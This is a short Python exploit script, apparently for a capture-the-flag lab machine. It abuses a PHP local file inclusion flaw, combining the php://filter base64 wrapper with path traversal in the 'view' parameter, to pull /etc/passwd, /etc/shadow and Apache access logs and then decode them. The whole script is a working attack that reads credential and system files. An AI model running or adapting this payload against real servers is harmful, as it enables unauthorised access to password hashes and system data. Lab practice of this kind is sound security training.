import requests
import base64

url = "http://10.10.214.81/"

base64_php_encode="php://filter/convert.base64-encode/resource="
#path = "../../../var/lib/mlocate/../../../var/www/html/flag"
path = "../../../var/lib/mlocate/../../../var/www/html/index"
path = "../../../var/lib/mlocate/../../../etc"
path = "../../../var/lib/mlocate/../../../var/log/apache2/"
#path = "../../../var/lib/mlocate/../../../var/www/html"
ext='/passwd'
ext='/shadow'
ext='/access.log'

to_pad = 996 - len(base64_php_encode + path)

#if to_pad % 2 != 0:
#   to_pad += 1

#for i in range(0, to_pad, 2):
#   path += "/."

#path += "/"

#filename = 'flag.php'

#path = path[:-len(filename)]

#path += filename

payload = base64_php_encode + path

r = requests.get(url, params={
    'view': payload,
    'ext': ext
})

if 'Warning' in r.text:
    print(r.text)
    exit(0)

print(r.text)


encoded_content = r.text.split('Here you go!')[1].split('</')[0].strip().encode('ascii')
print(encoded_content)

decoded = base64.b64decode(encoded_content).decode('utf-8')

print(decoded)